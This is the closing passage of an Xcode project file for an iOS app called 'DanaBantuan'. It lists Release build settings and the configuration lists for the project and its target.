				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		73DC2EAA2EFCD1B900CB14F8 /* Build configuration list for PBXProject "DanaBantuan" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				73DC2EC52EFCD1BA00CB14F8 /* Debug */,
				73DC2EC62EFCD1BA00CB14F8 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		73DC2EC22EFCD1BA00CB14F8 /* Build configuration list for PBXNativeTarget "DanaBantuan" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				73DC2EC32EFCD1BA00CB14F8 /* Debug */,
				73DC2EC42EFCD1BA00CB14F8 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 73DC2EA72EFCD1B900CB14F8 /* Project object */;
}
